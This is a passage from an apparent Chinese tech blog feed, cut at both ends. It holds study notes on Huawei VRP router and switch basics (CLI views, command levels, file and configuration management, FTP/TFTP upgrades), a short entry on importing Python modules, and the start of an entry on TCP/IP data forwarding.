&lt;interface&gt;</code>命令可以显示端口的RSTP配置情况。包括端口状态，端口优先级，端口开销，端口角色，是否为边缘端口等等。</p>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件导入</title>
    <link href="/2021/07/18/Python/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5/"/>
    <url>/2021/07/18/Python/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="自己的模块导入"><a href="#自己的模块导入" class="headerlink" title="自己的模块导入"></a>自己的模块导入</h1><p>由于经常写的代码中有很大一部分是重复性的，所有想将部分代码写到一个包中方便之后使用。</p><p>方法简单，在python安装的目录中的lib中添加自己的内容，如增加mycode目录</p><p>之后使用时如下导入即可</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> mycode <span class="hljs-keyword">import</span> **<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VRP基础,命令行基础,文件系统基础,VRP系统管理</title>
    <link href="/2021/07/16/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/VRP%E5%9F%BA%E7%A1%80/VRP%E5%9F%BA%E7%A1%80,%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80,%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80,VRP%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"/>
    <url>/2021/07/16/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/VRP%E5%9F%BA%E7%A1%80/VRP%E5%9F%BA%E7%A1%80,%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80,%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80,VRP%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="VRP基础-命令行基础-文件系统基础-VRP系统管理"><a href="#VRP基础-命令行基础-文件系统基础-VRP系统管理" class="headerlink" title="VRP基础,命令行基础,文件系统基础,VRP系统管理"></a>VRP基础,命令行基础,文件系统基础,VRP系统管理</h1><h2 id="1-VRP基础"><a href="#1-VRP基础" class="headerlink" title="1.VRP基础"></a>1.VRP基础</h2><p>通用路由平台VRP ( Versatile Routing Platform )是华为公司数据通信产品的通用操作系统平台，它以IP业务为核心，采用组件化的体系结构，在实现丰富功能特性的同时，还提供了基于应用的可裁剪和可扩展的功能，使得路由器和交换机的运行效率大大增加。能对VRP熟练地进行配置和操作是对网络工程师的一种基本要求。</p><ol><li>交换机的应用<ul><li>由集线器(HUB)和中继器组建的以太网，实质上是一种共享式以太网。共享式以太网的主要缺陷有︰冲突严重、广播泛滥、安全性差</li><li>交换机是工作在数据链路层的设备。交换机可以将一个共享式以太网分割为多个冲突域。链路层流量被隔离在不同的冲突域中进行转发，如此便极大地提升了以太网的性能。更进一步说，通常主机和交换机之间以及交换机与交换机之间都使用全双工技术进行通信，这时冲突现象会被彻底消除</li><li>在由Hub搭建的网络中，所有的主机都处于同一个冲突域，主机A发送数据给主机B时，其他主机都将收到此数据，但同时这些主机都不能发送数据。用交换机替代Hub后，因为交换机分割了冲突域，所以在主机A发送数据给主机B时，主机C和主机D之间也可以同时互相发送数据</li></ul></li><li>路由器的应用<ul><li>交换机虽然能够隔离冲突域，但是当一台设备发送广播帧时，其他设备仍然都会接收到该广播帧。随着网络规模的增大，广播会越来越多，这样就会影响网络的效率。路由器可以用来分割广播域，减少广播对网络效率的影响</li><li>一般情况下，广播帧的转发被限制在广播域内。广播域的边缘是路由器，因为通常路由器不会转发广播帧</li><li>路由器负责在网络间转发报文。它能够在自身的路由表里查找到达目的地的下一跳地址，将报文转发给下一跳路由器，如此重复，并最终将报文送达目的地</li></ul></li></ol><h3 id="1-1-VRP介绍"><a href="#1-1-VRP介绍" class="headerlink" title="1. 1 VRP介绍"></a>1. 1 VRP介绍</h3><ul><li>VRP是华为公司具有完全自主知识产权的网络操作系统，可以运行在多种硬件平台之上。VRP拥有一致的网络界面、用户界面和管理界面，为用户提供了灵活丰富的应用解决方案</li><li>VRP平台以TCP/IP协议簇为核心，实现了数据链路层、网络层和应用层的多种协议，在操作系统中集成了路由交换技术、QoS技术、安全技术和P语音技术等数据通信功能，并以IP转发引擎技术作为基础，为网络设备提供了出色的数据转发能力</li></ul><h3 id="1-2-设备管理口"><a href="#1-2-设备管理口" class="headerlink" title="1.2 设备管理口"></a>1.2 设备管理口</h3><p>ARG3系列路由器和X7系列交换机都提供了Console口作为管理口，AR2200额外提供了Mini USB口作为管理口</p><p>使用Console线缆来连接交换机或路由器的Console口与计算机的COM口，这样就可以通过计算机实现本地调试和维护</p><p>S5720和AR2200E的Console口是一种符合RS232串口标准的RJ45接口。目前大多数台式电脑提供的COM口都可以与Console口连接。笔记本电脑一般不提供COM口，需要使用USB到RS232的转换接口</p><p>在管理设备时，Console接口和Mini USB接口互斥，即同一时刻只能使用其中的1个接口连接到VRP</p><h3 id="1-3-参数配置"><a href="#1-3-参数配置" class="headerlink" title="1.3 参数配置"></a>1.3 参数配置</h3><ul><li><p>很多终端模拟程序都能发起Console连接，例如，可以使用超级终端程序连接到VRP操作系统。使用超级终端连接VRP时，必须设置端口参数。如果对参数值做了修改，需要恢复默认参数值</p></li><li><p>完成设置以后，点击“确定”按钮即可与VRP建立连接</p></li><li><p>在缺少超级终端程序的计算机上，可以使用putty或Secure CRT程序发起Console连接，并连接到VRP，配置参数：</p><p>位/秒：9600</p><p>数据位：0</p><p>奇偶校验：无</p><p>停止位：1</p><p>数据流控制：无</p></li></ul><h2 id="2-命令行基础"><a href="#2-命令行基础" class="headerlink" title="2.命令行基础"></a>2.命令行基础</h2><p>熟悉VRP命令行并熟练掌握VRP配置</p><h3 id="2-1-设备初始化"><a href="#2-1-设备初始化" class="headerlink" title="2.1 设备初始化"></a>2.1 设备初始化</h3><p>管理员和工程师如果要访问在通用路由平台VRP上运行的华为产品，首先要进入启动程序。开机界面信息提供了系统启动的运行程序和正在运行的VRP版本及其加载路径</p><p>启动完成以后，系统提示目前正在运行的是自动配置模式。用户可以选择是继续使用自动配置模式或是进入手动配置的模式</p><p>如果选择手动配置模式，在提示符处输入Y。在没有特别要求的情况下，我们选择手动配置模式</p><h3 id="2-2-命令行视图"><a href="#2-2-命令行视图" class="headerlink" title="2.2 命令行视图"></a>2.2 命令行视图</h3><ol><li><p>VRP分层的命令结构定义了很多命令行视图，每条命令只能在特定的视图中执行</p><p>进入到VRP系统的配置界面后，VRP上最先出现的视图是用户视图。在该视图下，用户可以查看设备的运行状态和统计信息</p><p>若要修改系统参数，用户必须进入系统视图(system-view)。用户还可以通过系统视图进入其他的功能配置视图，如接口视图和协议视图</p><p>通过提示符可以判断当前所处的视图，例如︰ “&lt;&gt;”表示用户视图，“[]”表示除用户视图以外的其它视图</p></li></ol><h3 id="2-3-命令行功能"><a href="#2-3-命令行功能" class="headerlink" title="2.3 命令行功能"></a>2.3 命令行功能</h3><p>为了简化操作，系统提供以下的快捷键</p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>CTRL+A</td><td>把光标移动到当前命令行的最前端</td></tr><tr><td>CTRL+C</td><td>停止当前命令的运行</td></tr><tr><td>CTRL+Z</td><td>回到用户视图</td></tr><tr><td>CTRL+]</td><td>终止当前连接或切换连接</td></tr><tr><td>CTRL+B</td><td>将光标左移一个字符</td></tr><tr><td>CTRL+D</td><td>删除当前光标所在位置的字符</td></tr><tr><td>CTRL+E</td><td>将光标移动到当前行的末尾</td></tr><tr><td>CTRL+F</td><td>将光标右移一个字符</td></tr><tr><td>CTRL+H</td><td>删除光标左侧的一个字符</td></tr><tr><td>CTRL+N</td><td>显示历史命令缓冲区中的后一条命令</td></tr><tr><td>CTRL+P</td><td>显示历史命令缓冲区中的前一条命令</td></tr><tr><td>CTRL+W</td><td>删除光标左侧的一个字符串</td></tr><tr><td>CTRL+X</td><td>删除光标左侧的所有字符</td></tr><tr><td>CTRL+Y</td><td>删除光标和其右侧的所有字符</td></tr><tr><td>ESC+B</td><td>将光标左移一个字符串</td></tr><tr><td>ESC+D</td><td>删除光标右侧的一个字符串</td></tr><tr><td>ESC+F</td><td>将光标右移一个字符串</td></tr><tr><td>Backspace</td><td>删除光标左边的第一个字符</td></tr><tr><td>TAB</td><td>输入不完整的命令并按TAB键，就可以补全该命令</td></tr></tbody></table><h3 id="2-4-命令行在线帮助"><a href="#2-4-命令行在线帮助" class="headerlink" title="2.4 命令行在线帮助"></a>2.4 命令行在线帮助</h3><p>VRP提供两种帮助功能，分别是部分帮助和完全帮助。</p><ol><li>部分帮助指的是，当用户输入命令时，如果只记得此命令关键字的开头一个或几个字符，可以使用命令行的部分帮助获取以该字符串开头的所有关键字的提示，如本例中所示</li><li>完全帮助指的是，在任一命令视图下，用户可以键入“?”获取该命令视图下所有的命令及其简单描述﹔如果键入一条命令关键字，后接以空格分隔的“?”，如果该位置为关键字，则列出全部关键字及其描述</li></ol><h3 id="2-5-基本配置步骤"><a href="#2-5-基本配置步骤" class="headerlink" title="2.5 基本配置步骤"></a>2.5 基本配置步骤</h3><ul><li><p>sysname</p><p>配置设备名称</p></li><li><p>clock timezone </p><p>设置所在时区</p><p>clock timezone BJ add 08:00:00</p></li><li><p>clock datetime</p><p>设置当前时间和日期</p><p>clock datetime 10:20:29 2020-02-22</p></li><li><p>clock daylight-saving-time</p><p>设置采用夏时制</p></li><li><p>header login</p><p>设置用户登录前显示的标题消息</p><p>header login information “xxxxxxx”</p></li><li><p>header shell</p><p>设置用户登录后显示的标题消息</p><p>header shell information “xxxxxxx”</p></li></ul><h3 id="2-6-命令等级"><a href="#2-6-命令等级" class="headerlink" title="2.6 命令等级"></a>2.6 命令等级</h3><ul><li>系统将命令进行分级管理，以增加设备的安全性</li><li>设备管理员可以设置用户级别，一定级别的用户可以使用对应级别的命令行</li><li>缺省情况下命令级别分为0<del>3级，用户级别分为0\</del>15级<ol><li><p>用户0级为访问级别，对应网络诊断工具命令( ping、tracert )、从本设备出发访问外部设备的命令(Telnet客户端)、部分display命令等</p></li><li><p>用户1级为监控级别，对应命令级0、1级，包括用于系统维护的命令以及display等命令</p></li><li><p>用户2级是配置级别，包括向用户提供直接网络服务，包括路由、各个网络层次的命令</p></li><li><p>用户3-15级是管理级别，对应命令3级，该级别主要是用于系统运行的命令，对业务提供支撑作用，包括文件系统、FTP、TFTP下载、文件交换配置、电源供应控制，备份板控制、用户管理、命令级别设置、系统内部参数设置以及用于业务故障诊断的debugging命令。本例展示了如何修改命令级别，在用户视图下执行save命令需要3级的权限</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">command-privilege level <span class="hljs-number">3</span> view <span class="hljs-keyword">user</span> <span class="hljs-title">save</span><br></code></pre></div></td></tr></table></figure></li></ol></li><li>在具体使用中，如果我们有多个管理员帐号，但只允许某一个管理员保存系统配置，则可以将save命令的级别提高到4级，并定义只有该管理员有4级权限。这样，在不影响其他用户的情况下，可以实现对命令的使用控制</li></ul><h3 id="2-7-用户界面"><a href="#2-7-用户界面" class="headerlink" title="2.7 用户界面"></a>2.7 用户界面</h3><ul><li><p>每类用户界面都有对应的用户界面视图</p><p>用户界面( User-interface )视图是系统提供的一种命令行视图，用来配置和管理所有工作在异步交互方式下的物理接口和逻辑接口，从而达到统一管理各种用户界面的目的。在连接到设备前，用户要设置用户界面参数</p><p>系统支持的用户界面包括Console用户界面和VTY用户界面</p><p>控制口（Console Port )是一种通信串行端口，由设备的主控板提供。虚拟类型终端(VirtualType Terminal )是一种虚拟线路端口，用户通过终端与设备建立Telnet或SSH连接后，也就建立了一条VTY，即用户可以通过VTY方式登录设备。设备一般最多支持15个用户同时通过VTY方式访问。执行user-interface maximum-vty number命令可以配置同时登录到设备的VTY类型用户界面的最大个数。如果将最大登录用户数设为0，则任何用户都不能通过TeInet或者SSH登录到路由器。display user-interface命令用来查看用户界面信息。</p></li><li><p>不同的设备，或使用不同版本的VRP软件系统，具体可以被使用的VTY接口的最大数量可能不同。</p></li></ul><h3 id="2-8-配置用户界面命令"><a href="#2-8-配置用户界面命令" class="headerlink" title="2.8 配置用户界面命令"></a>2.8 配置用户界面命令</h3><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>idle-timeout</td><td>设置超时时间</td></tr><tr><td>screen-length</td><td>设置指定终端屏幕的临时显示行数</td></tr><tr><td>history-cimmandmax-size</td><td>设置历史命令缓冲区的大小</td></tr></tbody></table><h3 id="2-9-配置登录权限"><a href="#2-9-配置登录权限" class="headerlink" title="2.9 配置登录权限"></a>2.9 配置登录权限</h3><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>user privilege</td><td>配置指定用户界面下的用户等级</td></tr><tr><td>set authentication password</td><td>配置本地认证密码</td></tr></tbody></table><ul><li>本页介绍只使用密码登陆的情况下，登陆权限的密码配置方式</li><li>配置用户界面的用户认证方式后，用户登录设备时，需要输入密码进行认证，这样就限制了用户访问设备的权限。在通过VTY进行Telnet连接时，所有接入设备的用户都必须要经过认证</li><li>设备提供三种认证模式，AAA模式、密码认证模式和不认证模式。AAA认证模式具有很高的安全性，因为登录时必须输入用户名和密码。密码认证只需要输入登录密码即可，所以所有的用户使用的都是同一个密码。使用不认证模式就是不需要对用户认证直接登陆到设备。需要注意的是，Console界面默认使用不认证模式</li><li>对于Telnet登录用户，授权是非常必要的，最好设置用户名、密码和指定和帐号相关联的权限</li><li>注︰不同VRP版本执行set authentication password cipher命令有差异∶有些平台需要回车后输入密码，另外一些平台可直接在命令后输入密码。故在操作具体产品时请查阅相应VRP产品文档。</li></ul><h3 id="2-10-配置接口IP地址"><a href="#2-10-配置接口IP地址" class="headerlink" title="2.10 配置接口IP地址"></a>2.10 配置接口IP地址</h3><ol><li><p>要在接口运行IP服务，必须为接口配置一个IP地址。一个接口一般只需要一个IP地址。在特殊情况下，也有可能为接口配置一个次要IP地址</p><p>例如，当路由器AR2200E的接口连接到一个物理网络时，该物理网络中的主机属于两个网段。为了让两个网段的主机都可以通过路由器AR2200E访问其它网络，可以配置一个主IP地址和一个次要IP地址。一个接口只能有一个主IP地址，如果接口配置了新的主IP地址，那么新的主IP地址就替代了原来的主IP地址</p></li><li><p>用户可以利用ip address &lt;ip-address &gt; { mask / mask-length }命令为接口配置IP地址，这个命令中，mask代表的是32比特的子网掩码，如255.255.255.0 ，mask-length 代表的是可替换的掩码长度值，如24，这两者可以交换使用</p></li><li><p>Loopback接口是一个逻辑接口，可用来虚拟一个网络或者一个IP主机。在运行多种协议的时候，由于Loopback接口稳定可靠，所以也可以用来做管理接口</p></li><li><p>在给物理接口配置IP地址时，需要关注该接口的物理状态。默认情况下，华为路由器和交换机的接口状态为up;如果该接口曾被手动关闭，则在配置完IP地址后，应使用undoshutdown打开该接口</p></li></ol><h2 id="3-文件系统基础"><a href="#3-文件系统基础" class="headerlink" title="3. 文件系统基础"></a>3. 文件系统基础</h2><p>华为网络设备的配置文件和VRP系统文件都保存在物理存储介质中，所以文件系统是VRP正常运行的基础。</p><h3 id="3-1-基本查询命令"><a href="#3-1-基本查询命令" class="headerlink" title="3.1 基本查询命令"></a>3.1 基本查询命令</h3><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>查看当前目录</td><td>pwd</td></tr><tr><td>显示当前目录下的问文件信息</td><td>dir</td></tr><tr><td>查看文本文件的具体内容</td><td>more</td></tr></tbody></table><ul><li>pwd命令用来显示当前工作目录</li><li>dir [ /all ] [ filename | directory ]命令用来查看当前目录下的文件信息</li><li>more [ /binary ] filename [ offset ] [ all ]命令用来查看文本文件的具体内容</li></ul><h3 id="3-2-目录操作"><a href="#3-2-目录操作" class="headerlink" title="3.2 目录操作"></a>3.2 目录操作</h3><ul><li>cd directory命令用来修改用户当前的工作目录</li><li>mkdir directory命令能够创建一个新的目录。目录名称可以包含1-64个字符</li><li>rmdir directory命令能够删除文件系统中的目录，此处需要注意的是，只有空目录才能被删除</li></ul><h3 id="3-3-文件操作"><a href="#3-3-文件操作" class="headerlink" title="3.3 文件操作"></a>3.3 文件操作</h3><ul><li>copy source-filename destination-filename命令可以复制文件。如果目标文件已存在，系统会提示此文件将被替换。目标文件名不能与系统启动文件同名，否则系统将会出现错误提示</li><li>move source-filename destination-filename命令可以用来将文件移动到其他目录下。move命令只适用于在同一储存设备中移动文件</li><li>rename old-name new-name命令可以用来对目录或文件进行重命名</li><li>delete [ /unreserved ] [ /force ] { filename | devicename }命令可以用来删除文件。一般情况下，被删除的文件将直接被移动到回收站。回收站中的文件也可以通过执行<br>undelete命令进行恢复，但是如果执行delete命令时指定了unreserved参数，则文件将被永久删除。在删除文件时，系统会提示“是否确定删除文件”，但如果命令中指定了<br>/force参数，系统将不会给出任何提示信息。filename参数指的是需要删除的文件的名称，device-name参数指定了储存设备的名称</li><li>reset recycle-bin [ filename | devicename ]可以用来永久删除回收站中的文件，<br>filename参数指定了需要永久删除的文件的名称，device-name参数指定了储存设备的名称</li></ul><h3 id="3-4-配置文件管理"><a href="#3-4-配置文件管理" class="headerlink" title="3.4 配置文件管理"></a>3.4 配置文件管理</h3><ul><li>设备中的配置文件分为两种类型:当前配置文件和保存的配置文件。当前配置文件储存在设备的RAM中。用户可以通过命令行对设备进行配置，配置完成后使用save命令保存当前配置到存储设备中，形成保存的配置文件。保存的配置文件都是以“.cfg”或“.zip”作为扩展名，存放在存储设备的根目录下</li><li>在设备启动时，会从默认的存储路径下加载保存的配置文件到RAM中。如果默认存储路径中没有保存的配置文件，则设备会使用缺省参数进行初始化配置。</li></ul><h3 id="3-5-配置文件查询"><a href="#3-5-配置文件查询" class="headerlink" title="3.5 配置文件查询"></a>3.5 配置文件查询</h3><ul><li>display current-configuration命令可以用来查看设备当前生效的配置</li><li>display current-configuration | begin {fregular-expression}命令可以显示以不同参数或表达式开头的配置</li><li>display current-configuration | include {fregular-expression}命令可以显示包含了指定关键字或表达式的配置</li><li>display saved-configuration [last|time]命令用来查看设备下次启动时加载的配置文件。使用last参数可以显示本次启动时使用的配置文件内容。使用time参数可以显示系统启动后最近的一次手工或者系统自动保存配置的时间</li></ul><h3 id="3-6-配置文件保存"><a href="#3-6-配置文件保存" class="headerlink" title="3.6 配置文件保存"></a>3.6 配置文件保存</h3><p>save [configuration-file]命令可以用来保存当前配置信息到系统默认的存储路径中。configuration-file为配置文件的文件名，此参数可选。</p><h3 id="3-7-系统启动文件查询"><a href="#3-7-系统启动文件查询" class="headerlink" title="3.7 系统启动文件查询"></a>3.7 系统启动文件查询</h3><ul><li>display startup命令用来查看设备本次及下次启动相关的系统软件、备份系统软件、配置文件、License文件、补丁文件以及语音文件</li><li>Startup system software表示的是本次系统启动所使用的VRP文件</li><li>Next startup system software表示的是下次系统启动所使用的VRP文件</li><li>Startup saved-configuration file表示的是本次系统启动所使用的配置文件</li><li>Next startup saved-configuration file表示的是下次系统启动所使用的配置文件</li></ul><h3 id="3-8-系统启动配置文件修改"><a href="#3-8-系统启动配置文件修改" class="headerlink" title="3.8 系统启动配置文件修改"></a>3.8 系统启动配置文件修改</h3><p>startup saved-configuration [configuration-file]命令用来指定系统下次启动时使用的配置文件，configuration-file参数为系统启动配置文件的名称</p><h3 id="3-9-比较当前配置和保存的配置"><a href="#3-9-比较当前配置和保存的配置" class="headerlink" title="3.9 比较当前配置和保存的配置"></a>3.9 比较当前配置和保存的配置</h3><ul><li>compare configuration [configuration-file] [current-line-number save-line-number]命令用来比较当前的配置与下次启动的配置文件内容的区别，configuration-file指定需要与当前配置进行比较的配置文件名，current-line-number表示从当前配置的该行号开始比较，save-line-number表示从指定配置的该行号开始比较</li><li>当执行该命令后，系统默认会将保存的配置与当前配置从第一行开始逐行进行比较。如果指定了current-line-number或save-line-number参数，系统会跳过不相关的配置，从指定的行号开始查找两个配置文件的不同。系统比较出不同之处以后，将从两者有差异的地方开始显示字符，默认显示120个字符，如果从该不同之处到文件末尾不足120个字符，将显示到文件尾为止</li></ul><h3 id="3-10-配置文件重置"><a href="#3-10-配置文件重置" class="headerlink" title="3.10 配置文件重置"></a>3.10 配置文件重置</h3><ul><li>reset saved-configuration命令用来清除存储设备中启动配置文件的内容</li><li>执行该命令后，如果不使用命令startup saved-configuration重新指定设备下次启动时使用的配置文件，也不使用save命令保存配置文件，则设备下次启动时会采用缺省的配置参数进行初始化</li></ul><h3 id="3-11-存储设备"><a href="#3-11-存储设备" class="headerlink" title="3.11 存储设备"></a>3.11 存储设备</h3><ul><li><p>存储设备包括SDRAM、Flash、NVRAM、SD卡、U盘。执行display version命令可以查看华为存储设备的详细信息</p></li><li><p>fixdisk命令用来对文件系统出现异常的存储设备进行修复</p><p>当存储设备上的文件系统出现异常时，终端会给出提示信息，此时建议使用此命令进行修复，但不确保修复成功。执行此命令后，如果仍然收到系统建议修复的信息，则表示物理介质可能已经损坏</p></li><li><p>此命令是问题修复类命令，在系统未出现问题时，建议用户不要执行此命令。注︰有些VRP版本不支持fixdisk命令，在操作具体产品时请查阅相应VRP产品文档</p></li><li><p>format [devicename]命令用来格式化存储器。在执行format命令时，需要指定<br>devicename参数，表示格式化特定的存储器。执行此命令后，会清空指定存储器中的所有文件和目录，并且不可恢复。请谨慎使用此命令!</p></li></ul><h2 id="4-VRP系统管理"><a href="#4-VRP系统管理" class="headerlink" title="4. VRP系统管理"></a>4. VRP系统管理</h2><h3 id="4-1-文件传输"><a href="#4-1-文件传输" class="headerlink" title="4.1 文件传输"></a>4.1 文件传输</h3><ul><li>文件传输是指发送文件到远程服务器，或者从远程服务器获取文件的过程</li><li>在实际场景中，为满足企业业务的需求，设备的VRP文件需要更新。如图中所示，设备在与服务器建立连接之后，可以从服务器获取新的VRP，完成更新工作</li><li>为避免数据丢失对业务造成影响，设备的配置文件和日志文件也通常会进行远程备份。如图中所示，设备在与服务器建立连接之后，可以将配置文件和日志文件传输到服务器上，完成备份工作。当设备上的文件丢失后，可以恢复之前服务器上备份的配置文件和日志文件</li></ul><h3 id="4-2-文件传输协议"><a href="#4-2-文件传输协议" class="headerlink" title="4.2 文件传输协议"></a>4.2 文件传输协议</h3><ol><li><p>FTP ( File Transfer Protocol )是TCP/IP协议族中的一种应用层协议，称为文件传输协议FTP的主要功能是向用户提供本地和远程主机之间的文件传输</p><p>在进行版本升级、日志下载和配置保存等业务操作时，会广泛地使用到FTP</p><p>FTP采用两个TCP连接︰控制连接和数据连接。其中控制连接用于连接控制端口，传输控制命令;数据连接用于连接数据端口，传输数据</p><p>在控制连接建立后，数据连接通过控制端口的命令建立起连接，进行数据的传输。FTP数据连接的建立有两种:主动模式和被动模式，两者的区别在于数据连接是由服务器发起还是由客户端发起。ARG3系列路由器既可以作为FTP Client又可以作为FTP Server。缺省情况下，AR2200采用主动模式建立数据连接</p></li><li><p>TFTP ( Trivial File Transfer Protocol )是一种简化的文件传输协议。</p><p>TFTP协议使用UDP协议进行文件的传输，由客户端发起TFTP传输请求，实现文件的上传和下载。ARG3系列路由器只可以作为TFTP客户端</p></li></ol><h3 id="4-3-VRP系统文件更新配置-从FTP-TFTP服务器获取VRP"><a href="#4-3-VRP系统文件更新配置-从FTP-TFTP服务器获取VRP" class="headerlink" title="4.3 VRP系统文件更新配置-从FTP/TFTP服务器获取VRP"></a>4.3 VRP系统文件更新配置-从FTP/TFTP服务器获取VRP</h3><p><img src="https://pic.imgdb.cn/item/60f132515132923bf802d8c9.png"></p><ol><li>如需从FTP服务器获取文件，客户端需使用ftp lip address]命令来发起FTP连接请求，其中ip address指的是FTP服务器的IP地址。客户端和FTP服务器建立连接之后，客户端需要使用FTP服务器中配置的用户名和密码进行认证。认证通过后，客户端可以访问FTP服务器，并且能够查看和下载存储在服务器中的文件</li><li>本例中客户端使用ftp 10.1.1.2和FTP服务器建立了连接，使用get AR2220E-V200R007C00SPC600.cc命令可以获取位于FTP服务器上的VRP文件</li><li>如果客户端需要从TFTP服务器获取VRP文件，则不需要首先和TFTP服务器建立连接。ARG3系列路由器和X7系列交换机只能作为TFTP客户端。客户端通过配置tftp10.1.1.2 get AR2220E-V200R003C00SPC600.cc就可以从TFTP服务器获取VRP文件</li></ol><h3 id="4-4-VRP系统文件更新配置-指定下次启动时加载的VRP"><a href="#4-4-VRP系统文件更新配置-指定下次启动时加载的VRP" class="headerlink" title="4.4 VRP系统文件更新配置-指定下次启动时加载的VRP"></a>4.4 VRP系统文件更新配置-指定下次启动时加载的VRP</h3><ol><li>从服务器成功获取VRP文件后，还需要配置此文件为设备下次启动的系统文件，否则，设备仍会使用旧版本的VRP系统文件。在设备上通过使用startup system-software命令可以指定设备下次启动的系统文件。VRP系统文件必须存储在根目录，否则系统不能正常运行</li><li>可以使用display startup命令去验证系统启动文件是否已经变更，显示信息中Startup system software显示当前系统启动使用的VRP文件，Next startup systemsoftware显示下次系统启动使用的VRP文件</li></ol><h3 id="4-5-VRP系统文件更新配置-重启设备"><a href="#4-5-VRP系统文件更新配置-重启设备" class="headerlink" title="4.5 VRP系统文件更新配置-重启设备"></a>4.5 VRP系统文件更新配置-重启设备</h3><p>确认系统下次启动软件正确后，需要重启设备。使用reboot命令可以重启设备。输入此命令后，系统会提示是否保存配置文件;实际中，可根据需要进行选择。</p>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>VRP基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据转发过程</title>
    <link href="/2021/07/16/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/TCP,IP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%8F%91%E8%BF%87%E7%A8%8B/"/>
    <url>/2021/07/16/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/TCP,IP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%8F%91%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="数据转发过程"><a href="#数据转发过程" class="headerlink" title="数据转发过程"></a>数据转发过程</h1><p><strong>转发过程概述</strong></p><p><img src="https://pic.imgdb.cn/item/60f11bf65132923bf8461e2a.png"></p><ul><li><p>数据可以在同一网络内或者不同网络间传输，数据转发过程也分为本地转发和远程转发，但两者的数据转发原理是基本一样的，都是遵循TCP/IP协议簇</p></li><li><p>本示例中，主机A需要访问服务器A的Web服务，并且假定两者之间已经建立了TCP连接。接下来会以此示例来讲解数据在不同网络间的传输过程</p><ol><li><p>TCP封装</p><p>主机A会对待发送的应用数据首先执行加密和压缩等相关操作，之后进行传输层封装</p><p>Web应用是基于传输层的TCP协议传输数据的。主机A使用TCP进行报文封装时，必须填充源端口和目的端口字段，初始序列号和确认序列号字段，标识位，窗口字段以及校验和字段</p><p>此例中数据段的源端口号为主机A随机选择的1027号端口，目的端口号为服务器A的TCP知名端口80</p><p>结果如下</p><p><img src="https://pic.imgdb.cn/item/60f11d0e5132923bf84f0f12.png"></p></li><li><p>IP封装</p><p>主机A完成传输层封装后，一般会进行网络层数据封装，在使用IP进行封装时，需要明确IP报文的源和目的地址。如果IP报文的大小大于网络的最大传输单元(MTU)，则该报文有可能在传输过程中被分片</p><p>生存时间(TTL）字段用来减少网络环路造成的影响。ARG3系列路由器产生的数据包，默认TTL值为255。路由器转发一个数据包时，该值会被减1，如果路由器发现该值被减为0，就会丢弃该数据包。这样，即使网络中存在环路，数据包也不会在网络上一直被转发。协议字段标识了传输层所使用的协议。本例中，传输层使用的是TCP协议，所以该字段的填充值为0X06</p><p><img src="https://pic.imgdb.cn/item/60f11ce55132923bf84db0c8.png"></p></li><li><p>查找路由</p><p>每个主机都会独自维护各自的路由表项。主机A在发送数据前需要先检查是否能够到达目的端，这个过程是通过查找路由来完成的</p><p>在此示例中，主机A拥有一条到达“任何网络”(在IP编址部分已经简要介绍过)的路由，它发往其他网络的数据都会通过IP地址为10.1.1.1的接口转发到下一跳，即网关10.1.1.254</p><p><img src="https://pic.imgdb.cn/item/60f11dd15132923bf8556678.png"></p></li><li><p>ARP</p><p>接下来，由于数据包要被封装成数据帧，所以主机A需要获取下一跳的MAC地址，也就是网关的MAC地址。主机首先会查询ARP缓存表。本例中，主机A的ARP缓存表中存在网关MAC地址的表项</p><p>如果没有查找到网关的MAC地址表项，主机A会通过发送ARP请求来获取网关的MAC地址</p><p><img src="https://pic.imgdb.cn/item/60f11e445132923bf85918ab.png"></p></li><li><p>以太网封装</p><p>主机A在链路层封装数据帧时，会遵循EEE 802.3或Ethernet_Ⅱ标准，Ethernet_Ⅱ帧头中的类型字段填充为0x0800，以表示网络层使用的是IP协议。源MAC地址为主机A的MAC地址，目的MAC地址为网关路由器E0/0接口的MAC地址</p></li></ol></li><li><p>数据帧转发过程</p><ol><li><p>主机A工作在半双工状态下，所以会使用CSMA/CD来检测链路是否空闲。如果链路空闲，主机A会将一个前导码(Preamble )和一个帧首定界符( 